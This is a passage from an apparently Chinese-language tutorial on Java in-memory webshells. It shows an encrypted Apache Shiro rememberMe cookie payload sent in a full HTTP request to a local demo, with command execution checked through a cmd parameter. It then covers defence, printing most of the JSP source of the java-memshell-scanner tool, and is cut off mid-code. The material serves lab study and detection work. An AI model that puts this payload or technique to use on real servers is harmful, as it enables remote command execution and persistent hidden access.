cl1jtbMwaAd0YJ8tXTHK4qZbVnKBMSMsYAuVQHl+rkTPakjBgh0t16bovYZml2UUy09PMRWsMWbcAW7/ZWtAJxBMr9XCWKsFMtPeu9i0rj3galIMU8C7SRfFrkrtPiWoKR2D9IbPaiC93vbStVfAoQId7inS8bShpLpllh9sS0Q7TlNE+6JK0GJar9FBppNodDtLlPpo0zRUJFEqlQaF/6udr/vykGM2DXptSOetPnWH1yyQgvS65gz6C7e4kVJMneoc9kKfmmtYSCGMZ4ktary1+wONOl9/pJ/O4x16Y9hk8tYVc49lk3lLB8h9xs6dF26N3VNQNwmSvqtBsidpACp1IWDpek1N6uK+cVzRnippx+bbt/8dxd+6VuUDivPoHBNres8TkCBfmOukSUdZyU7oBrT8gp5OWjq4qF9u3kzIJ4KQ/bX1Rhh1SYa1TfawLyDD10mxhb4ggeckLu/QQBp2WnKzBXQxOu7KiA/fVrTFLeKQfEMh19pRTt4NW2AhszQL8cD+3VAIS6V/LLKNiQFGiKDCEsCUPCOa4dXwnwj4KZg9HLLUSAgEYEJKNz6trZXA+0n+GZoY2caXLUos/f+goWclMxAnlj6yY1D2nhnTztJ+2mVRSFzM1qqRw8mYBACMMt0y0KRj/y59m0Gfix7BeaxuGSUkMFnF0eKQ3eqdCqNOm9i7chl1y8JTEQBfwvrG4dxzeCDyBaYEdhlxdHwYtbsAZrTIdXCTJWmmyuLs98AMc0qUPyM4HMq6x5bjTFJozFuvi9fkIbASZoVdAr1Fdfmk8fEv/G5zF9Z3exwT1e+l1PQJET9RgIBYwXqFwR3Awbv5Ha0xciWXWdC0/FtNDMH3BIboO3154i0ygute+4UtbniMM/snGwakx2QwlGbL9WURte63xZMTR84esGhO3QP3azEyWMvUQB3rt0DKpFedw0SO96jtOXT0j3chg7ntVQNmS84AppB0VMEMOpmBaJl+69bSR8GFx6A+0Wg7wkRu5cyMasZ/v1RKwVJlMnL9WLltykFpZGliJG61Go9CBW/kTHxCjIcr6s8hlUX8s287wBtXL5kjQPkDlMoQNraop1wch2i2pihC2PHAq6RNbedU7dpBUTf7iGGvclMx88HMMOQbsUiTI8vPeETahNp3Itqwc5jZ04hrm1l9cA1eaHasQ13npI9vcJx4UEf8UUw7tgsjjk4JNySMNEDT4Mi+kD19xoHqt1Ect7L4hVh
```



#### 3、抓包修改rememberMe对应的value值。

![image-20241101162907225](https://image.201068.xyz/assets/8.Java内存马/image-20241101162907225.png)

![image-20241101162937961](https://image.201068.xyz/assets/8.Java内存马/image-20241101162937961.png)

![image-20241101163900497](https://image.201068.xyz/assets/8.Java内存马/image-20241101163900497.png)

![image-20241101163111254](https://image.201068.xyz/assets/8.Java内存马/image-20241101163111254.png)

```bash
rememberMe=
```

![image-20241101164034690](https://image.201068.xyz/assets/8.Java内存马/image-20241101164034690.png)

```bash
POST /shirodemo/login.jsp HTTP/1.1
Host: 127.0.0.1:8989
Content-Length: 56
Cache-Control: max-age=0
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8989
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8989/shirodemo/login.jsp
Accept-Encoding: gzip, deflate, br
Cookie: rememberMe=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
Connection: keep-alive

username=guest&password=guest&rememberMe=on&submit=Login
```



#### 4、验证：

```bash
http://127.0.0.1:8989/shirodemo/login.jsp?cmd=whoami
http://127.0.0.1:8989/shirodemo/login.jsp?cmd=calc
```

![image-20241101164054950](https://image.201068.xyz/assets/8.Java内存马/image-20241101164054950.png)

![image-20241101164116989](https://image.201068.xyz/assets/8.Java内存马/image-20241101164116989.png)

### 内存马防御

#### 整体防御思路

由于内存马是一种**仅在内存中执行**，不写入硬盘的恶意程序，其能够隐蔽地进行攻击，同时躲避常规的病毒检测手段，

只能**通过识别内存马特征**，检出内存马方式为蓝方防御内存马攻击的整体思路。

如果通过**人工干预跟踪内存马特征的方式**进行检测对人员要求比较高，可以用一些**辅助检测工具**来实现：

#### 开源项目

##### java-memshell-scanner

通过**jsp脚本扫描**`java web Filter/Servlet`型内存马

github：https://github.com/c0ny1/java-memshell-scanner

###### 下载

```bash
git clone https://github.com/c0ny1/java-memshell-scanner.git
```

###### java-memshell-scanner.jsp

```jsp
<%@ page import="java.net.URL" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="com.sun.org.apache.bcel.internal.Repository" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.concurrent.CopyOnWriteArrayList" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>tomcat-memshell-killer</title>
</head>
<body>
<center>
    <div>
        <%!
            public Object getStandardContext(HttpServletRequest request) throws NoSuchFieldException, IllegalAccessException {
                Object context = request.getSession().getServletContext();
                Field _context = context.getClass().getDeclaredField("context");
                _context.setAccessible(true);
                Object appContext = _context.get(context);
                Field __context = appContext.getClass().getDeclaredField("context");
                __context.setAccessible(true);
                Object standardContext = __context.get(appContext);
                return standardContext;
            }

            public HashMap<String, Object> getFilterConfig(HttpServletRequest request) throws Exception {
                Object standardContext = getStandardContext(request);
                Field _filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
                _filterConfigs.setAccessible(true);
                HashMap<String, Object> filterConfigs = (HashMap<String, Object>) _filterConfigs.get(standardContext);
                return filterConfigs;
            }

            // FilterMap[]
            public Object[] getFilterMaps(HttpServletRequest request) throws Exception {
                Object standardContext = getStandardContext(request);
                Field _filterMaps = standardContext.getClass().getDeclaredField("filterMaps");
                _filterMaps.setAccessible(true);
                Object filterMaps = _filterMaps.get(standardContext);

                Object[] filterArray = null;
                try { // tomcat 789
                    Field _array = filterMaps.getClass().getDeclaredField("array");
                    _array.setAccessible(true);
                    filterArray = (Object[]) _array.get(filterMaps);
                } catch (Exception e) { // tomcat 6
                    filterArray = (Object[]) filterMaps;
                }

                return filterArray;
            }

            /**
             * 遗留问题,getFilterConfig()依然存在2个
             * @param request
             * @param filterName
             * @throws Exception
             */
            public synchronized void deleteFilter(HttpServletRequest request, String filterName) throws Exception {
                Object standardContext = getStandardContext(request);
                // org.apache.catalina.core.StandardContext#removeFilterDef
                HashMap<String, Object> filterConfig = getFilterConfig(request);
                Object appFilterConfig = filterConfig.get(filterName);
                Field _filterDef = appFilterConfig.getClass().getDeclaredField("filterDef");
                _filterDef.setAccessible(true);
                Object filterDef = _filterDef.get(appFilterConfig);
                Class clsFilterDef = null;
                try {
                    // Tomcat 8
                    clsFilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                } catch (Exception e) {
                    // Tomcat 7
                    clsFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef");
                }
                Method removeFilterDef = standardContext.getClass().getDeclaredMethod("removeFilterDef", new Class[]{clsFilterDef});
                removeFilterDef.setAccessible(true);
                removeFilterDef.invoke(standardContext, filterDef);

                // org.apache.catalina.core.StandardContext#removeFilterMap
                Class clsFilterMap = null;
                try {
                    // Tomcat 8
                    clsFilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception e) {
                    // Tomcat 7
                    clsFilterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }
                Object[] filterMaps = getFilterMaps(request);
                for (Object filterMap : filterMaps) {
                    Field _filterName = filterMap.getClass().getDeclaredField("filterName");
                    _filterName.setAccessible(true);
                    String filterName0 = (String) _filterName.get(filterMap);
                    if (filterName0.equals(filterName)) {
                        Method removeFilterMap = standardContext.getClass().getDeclaredMethod("removeFilterMap", new Class[]{clsFilterMap});
                        removeFilterDef.setAccessible(true);
                        removeFilterMap.invoke(standardContext, filterMap);
                    }
                }
            }

            public synchronized void deleteServlet(HttpServletRequest request, String servletName) throws Exception {
                HashMap<String, Object> childs = getChildren(request);
                Object objChild = childs.get(servletName);
                String urlPattern = null;
                HashMap<String, String> servletMaps = getServletMaps(request);
                for (Map.Entry<String, String> servletMap : servletMaps.entrySet()) {
                    if (servletMap.getValue().equals(servletName)) {
                        urlPattern = servletMap.getKey();
                        break;
                    }
                }

                if (urlPattern != null) {
                    // 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping
                    Object standardContext = getStandardContext(request);
                    Method removeServletMapping = standardContext.getClass().getDeclaredMethod("removeServletMapping", new Class[]{String.class});
                    removeServletMapping.setAccessible(true);
                    removeServletMapping.invoke(standardContext, urlPattern);
                    // Tomcat 6必须removeChild 789可以不用
                    // 反射调用 org.apache.catalina.core.StandardContext#removeChild
                    Method removeChild = standardContext.getClass().getDeclaredMethod("removeChild", new Class[]{org.apache.catalina.Container.class});
                    removeChild.setAccessible(true);
                    removeChild.invoke(standardContext, objChild);
                }
            }

            public synchronized HashMap<String, Object> getChildren(HttpServletRequest request) throws Exception {
                Object standardContext = getStandardContext(request);
                Field _children = standardContext.getClass().getSuperclass().getDeclaredField("children");
                _children.setAccessible(true);
                HashMap<String, Object> children = (HashMap<String, Object>) _children.get(standardContext);
                return children;
            }


            public synchronized HashMap<String, String> getServletMaps(HttpServletRequest request) throws Exception {
                Object standardContext = getStandardContext(request);
                Field _servletMappings = standardContext.getClass().getDeclaredField("servletMappings");
                _servletMappings.setAccessible(true);
                HashMap<String, String> servletMappings = (HashMap<String, String>) _servletMappings.get(standardContext);
                return servletMappings;
            }

            public synchronized List<Object> getListenerList(HttpServletRequest request) throws Exception {
                Object standardContext = getStandardContext(request);
                Field _listenersList = standardContext.getClass().getDeclaredField("applicationEventListenersList");
                _listenersList.setAccessible(true);
                List<Object> listenerList = (CopyOnWriteArrayList) _listenersList.get(standardContext);
                return listenerList;
            }

            public String getFilterName(Object filterMap) throws Exception {
                Method getFilterName = filterMap.getClass().getDeclaredMethod("getFilterName");
                getFilterName.setAccessible(true);
                return (String) getFilterName.invoke(filterMap, null);
            }

            public String[] getURLPatterns(Object filterMap) throws Exception {
                Method getFilterName = filterMap.getClass().getDeclaredMethod("getURLPatterns");
                getFilterName.setAccessible(true);
                return (String[]) getFilterName.invoke(filterMap, null);
            }


            String classFileIsExists(Class clazz) {
                if (clazz == null) {
                    return "class is null";
                }

                String className = clazz.getName();
                String classNamePath = className.replace(".", "/") + ".class";
                URL is = clazz.getClassLoader().getResource(classNamePath);
                if (is == null) {
                    return "在磁盘上没有对应class文件，可能是内存马";
                } else {
                    return is.getPath();
                }
            }

            String arrayToString(String[] str) {
                String res = "[";
                for (String s : str) {
                    res += String.format("%s,", s);
                }
                res = res.substring(0, res.length() - 1);
                res += "]";
                return res;
            }
        %>

        <%
            out.write("<h2>Tomcat memshell scanner 0.1.0</h2>");
            String action = request.getParameter("action");
            String filterName = request.getParameter("filterName");
            String servletName = request.getParameter("servletName");
            String className = request.getParameter("className");
            if (action != null && action.equals("kill") && filterName != null) {
                deleteFilter(request, filterName);
            } else if (action != null && action.equals("kill") && servletName != null) {
                deleteServlet(request, servletName);
            } else if (action != null && action.equals("dump") && className != null) {
                byte[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes();
                response.addHeader("content-Type", "application/octet-stream");
                String filename = Class.forName(className).getSimpleName() + ".class";

                String agent = request.getHeader("User-Agent");
                if (agent.toLowerCase().indexOf("chrome") > 0) {
                    response.addHeader("content-Disposition", "attachment;filename=" + new String(filename.getBytes("UTF-8"), "ISO8859-1"));
                } else {
                    response.addHeader("content-Disposition", "attachment;filename=" + URLEncoder.encode(filename, "UTF-8"));
                }
                ServletOutputStream outDumper = response.getOutputStream();
                outDumper.write(classBytes, 0, classBytes.length);
                outDumper.close();
            } else {
                // Scan filter
                out.write("<h4>Filter scan result</h4>");
                out.write("<table border=\"1\" cellspacing=\"0\" width=\"95%\" style=\"table-layout:fixed;word-break:break-all;background:#f2f2f2\">\n" +
                        "    <thead>\n" +
                        "        <th width=\"5%\">ID</th>\n" +
                        "        <th width=\"10%\">Filter name</th>\n" +
                        "        <th width=\"10%\">Patern</th>\n" +
